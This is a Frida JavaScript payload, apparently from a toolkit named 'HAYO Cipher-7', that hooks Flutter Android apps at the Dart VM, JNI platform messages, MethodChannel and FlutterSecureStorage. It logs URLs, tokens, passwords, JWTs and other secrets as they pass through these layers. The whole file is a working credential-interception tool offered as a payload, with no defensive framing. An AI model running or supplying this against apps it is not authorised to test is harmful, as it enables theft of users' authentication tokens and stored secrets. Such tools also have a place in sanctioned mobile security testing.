/* HAYO Cipher-7 — Flutter/dart:io SecureSocket Interception (payload_flutter.js)
 * ===========================================================================
 * Hooks Flutter app networking: Dart VM, dart:io HttpClient/SecureSocket,
 * Flutter plugin channels (MethodChannel), FlutterSecureStorage, SharedPreferences.
 */
Java.perform(function () {
    console.log("[FLUTTER] Hooking Flutter networking stack...");

    function findDartVM() {
        var libs = ["libflutter.so", "libdart.so", "flutter", "dart"];
        for (var i = 0; i < libs.length; i++) {
            try {
                var mod = Process.findModuleByName(libs[i]);
                if (mod) {
                    console.log("[FLUTTER] Found Dart module: " + libs[i] + " @ " + mod.base);
                    var dartNewString = Module.findExportByName(libs[i], "Dart_NewStringFromUTF8");
                    if (dartNewString) {
                        Interceptor.attach(dartNewString, {
                            onEnter: function (args) {
                                if (args[0] != null) {
                                    try {
                                        var str = Memory.readUtf8String(args[0]);
                                        if (str && (str.indexOf("https://") !== -1 || str.indexOf("api.") !== -1 || str.indexOf("token") !== -1 || str.indexOf("secret") !== -1 || str.indexOf("key") !== -1 || str.indexOf("password") !== -1 || str.indexOf("auth") !== -1)) {
                                            console.log("[FLUTTER][DART] String: " + str.substring(0, 300));
                                        }
                                    } catch (e) {}
                                }
                            }
                        });
                    }
                    return true;
                }
            } catch (e) {}
        }
        return false;
    }

    function hookFlutterJNI() {
        try {
            var FlutterJNI = Java.use("io.flutter.embedding.engine.FlutterJNI");
            if (FlutterJNI) {
                console.log("[FLUTTER] Found FlutterJNI");
                try {
                    FlutterJNI.dispatchPlatformMessage.overload('java.lang.String', 'java.nio.ByteBuffer', 'int', 'int').implementation = function (channel, buffer, position, responseId) {
                        var msg = channel + " | ";
                        if (buffer != null) {
                            var data = [];
                            for (var i = 0; i < buffer.limit() && i < 200; i++) data.push(buffer.get(i));
                            msg += String.fromCharCode.apply(null, data);
                        }
                        console.log("[FLUTTER][JNI] " + msg);
                        if (/token|secret|key|password|auth|jwt|bearer|api.?key/i.test(msg)) console.log("[FLUTTER][JNI][SENSITIVE] " + msg);
                        return this.dispatchPlatformMessage(channel, buffer, position, responseId);
                    };
                } catch (e) {}
            }
        } catch (e) {}
    }

    function hookMethodChannel() {
        try {
            var MethodChannel = Java.use("io.flutter.plugin.common.MethodChannel");
            MethodChannel.invokeMethod.overload('java.lang.String', 'java.lang.Object', 'io.flutter.plugin.common.MethodChannel$Result').implementation = function (method, args, result) {
                console.log("[FLUTTER][CHANNEL] invokeMethod: " + method + " | " + (args ? args.toString().substring(0, 200) : "null"));
                if (/token|secret|key|password|auth|jwt|bearer|login|sign.?in/i.test(method)) console.log("[FLUTTER][CHANNEL][SENSITIVE] " + method + " " + (args ? args.toString().substring(0, 200) : ""));
                return this.invokeMethod(method, args, result);
            };
        } catch (e) {}
        try {
            var BasicMessageChannel = Java.use("io.flutter.plugin.common.BasicMessageChannel");
            BasicMessageChannel.send.overload('java.lang.Object').implementation = function (msg) {
                var str = msg ? msg.toString() : "null";
                console.log("[FLUTTER][CHANNEL] send: " + str.substring(0, 300));
                return this.send(msg);
            };
        } catch (e) {}
    }

    function hookFlutterPlugins() {
        try {
            var FlutterSecureStorage = Java.use("com.it_nomad.flutter_secure_storage.FlutterSecureStoragePlugin");
            if (FlutterSecureStorage) {
                console.log("[FLUTTER] FlutterSecureStorage found");
                try { FlutterSecureStorage.read.overload('java.lang.String').implementation = function (key) { var v = this.read(key); console.log("[FLUTTER][STORAGE] read(" + key + ") = " + (v ? v.substring(0,200) : "null")); return v; }; } catch (e) {}
                try { FlutterSecureStorage.write.overload('java.lang.String', 'java.lang.String').implementation = function (key, value) { console.log("[FLUTTER][STORAGE] write(" + key + ", " + (value ? value.substring(0,200) : "null") + ")"); return this.write(key, value); }; } catch (e) {}
            }
        } catch (e) {}
        try {
            var SharedPrefsPlugin = Java.use("io.flutter.plugins.sharedpreferences.SharedPreferencesPlugin");
            if (SharedPrefsPlugin) console.log("[FLUTTER] SharedPreferences plugin found");
        } catch (e) {}
    }

    findDartVM();
    hookFlutterJNI();
    hookMethodChannel();
    hookFlutterPlugins();
    console.log("[FLUTTER] All Flutter hooks installed.");
});
